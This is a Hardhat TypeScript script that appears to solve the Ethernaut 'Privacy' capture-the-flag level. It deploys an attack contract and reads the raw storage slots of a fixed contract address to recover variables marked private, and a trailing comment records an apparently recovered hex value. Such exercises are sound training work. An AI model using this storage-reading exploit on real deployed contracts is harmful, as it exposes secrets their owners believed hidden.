import { ethers } from "hardhat";
import * as dotenv from "dotenv"
import { AttackPrivacy__factory } from "../typechain-types";
dotenv.config()

const CONTRACT_ADDRESS = "0x81326B40d01E7AF2C41e52BE01516b080F8eC97c"

async function main() {
    const wallet = new ethers.Wallet(process.env.PRIVATE_KEY ?? "")
    const provider = new ethers.providers.JsonRpcProvider(
        process.env.ALCHEMY_HTTPS_API_KEY
    )
    const signer = wallet.connect(provider)

    const attackContractFactory = new AttackPrivacy__factory(signer);
    const attackContract = await attackContractFactory.deploy();

    console.log("Calling attack()...")
    const tx = await attackContract.showPassword();
    console.log(`Attack was successful! ${tx}`)


    // 0 slot - bool public locked = true;
    // 1 slot - uint256 public ID = block.timestamp;
    // 2 slot - uint8 private flattening = 10;
    // 2 slot - uint8 private denomination = 255;
    // 2 slot - uint16 private awkwardness = uint16(block.timestamp);
    // 3,4,5 slots - bytes32[3] private data;

    const storage0 = await provider.getStorageAt(CONTRACT_ADDRESS, 0)
    console.log(`The storage at 0 is ${storage0}\n`)
    const storage1 = await provider.getStorageAt(CONTRACT_ADDRESS, 1)
    console.log(`The storage at 1 is ${storage1}\n`)
    // Convert the storage to a number
    const storage1Number = ethers.BigNumber.from(storage1)
    console.log(`The storage at 1 as a number is ${storage1Number}\n`)

    const storage2 = await provider.getStorageAt(CONTRACT_ADDRESS, 2)
    console.log(`The storage at 2 is ${storage2}\n`)
    // Convert the storage to a number
    const storage2Number = ethers.BigNumber.from(storage2)
    console.log(`The storage at 2 as a number is ${storage2Number}\n`)

    const storage3 = await provider.getStorageAt(CONTRACT_ADDRESS, 3)
    console.log(`The storage at 3 is ${storage3}\n`)

    //console.log(ethers.utils.toUtf8String(storage3))
    const storage4 = await provider.getStorageAt(CONTRACT_ADDRESS, 4)
    console.log(`The storage at 4 is ${storage4}\n`)
    const storage5 = await provider.getStorageAt(CONTRACT_ADDRESS, 5)
    console.log(`The storage at 5 is ${storage5}\n`)

    const storage6 = await provider.getStorageAt(CONTRACT_ADDRESS, 6)
    console.log(`The storage at 6 is ${storage6}\n`)

    // 0xb22f7b012794b7d09bfc5c7d048c9ab84458489122521730f71eb9ffd7d992a1
}


main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});